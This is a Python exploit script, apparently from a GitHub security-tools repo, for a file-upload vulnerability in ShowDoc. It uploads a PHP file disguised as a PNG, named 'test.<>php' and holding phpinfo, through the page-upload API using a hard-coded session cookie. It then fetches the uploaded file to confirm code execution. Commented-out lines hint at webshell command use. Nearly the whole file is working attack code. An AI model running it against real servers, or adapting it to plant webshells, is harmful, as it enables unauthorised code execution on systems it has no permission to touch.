from requests_toolbelt.multipart.encoder import MultipartEncoder
import requests
from urllib.parse import urljoin
import sys
import getopt

def scan(urls,pages):
    result = {}
    veri_url = urljoin(urls, '/server/index.php?s=/api/page/upload')
    # veri_url2 = urljoin(self.url, 'ispirit/interface/gateway.php')
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    cookies = {"PHPSESSID": "ila73il0inbq5arg8e9t2l575l;"}
    m = MultipartEncoder(
        fields={
            'page_id': '456',
            'item_id': '27',
            'file': ('test.<>php', '<?php phpinfo(); ?>', "image/png")
        },
        boundary='----WebKitFormBoundaryd4AI72IsEHGTtdnU'
    )

    resp = requests.post(veri_url, data=m, cookies=cookies, headers={'Content-Type': m.content_type})
    if '.php' in resp.text:
        text = resp.text
        #print(text)
        content = text.split('{"url":"')[1].split('server')[0]

        content1 = text.split('..')[1].split('"')[0]

        webshell = content + content1
        # payload = "json={'url':'/general/../../attach/im/%s/%s.jpg'}" % (content[0], content[1])
        # requests.post(veri_url2, data=payload, proxies=proxies)
        # data = 'cmd=echo "xdz";'
        webshell1 = webshell.replace('\\', '')
        req = requests.get(webshell1,)
        #print(req.text)
        if req.status_code == 200:
            print("\033[0;32;47m %s                   + 存在showdoc文件上传漏洞 \033[0m" % (webshell1))
        else:
            print("\033[0;31;47m %s                   - 未发现漏洞信息 \033[0m" % (urls))
def start(argv):
    urls = ""
    pages = ""
    if len(sys.argv) < 2:

        print('\033[1;34m############################\033[0mhttps://github.com/purple-WL\033[1;34m############################\033[0m')

        print("eg: python xxx.py -h/u")
        print("注意: 需要自己先进行注册并替换cookie")
        sys.exit()
    try:
        banner()
        opts,argv = getopt.getopt(argv,"-u:-h")
    except getopt.GetoptError:
        print('Error')
        sys.exit()
    for opt,arg in opts:
        if opt == "-u":
            urls = arg
        elif opt == "-h":
            print(usage())
    scan(urls,pages) #将参数传入scan函数


def banner():
    print('\033[1;34m############################\033[0mhttps://github.com/purple-WL\033[1;34m############################\033[0m\n')


def usage():
    print('-h: 帮助')
    print('-u: 域名')
    sys.exit()

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("killing all.....")
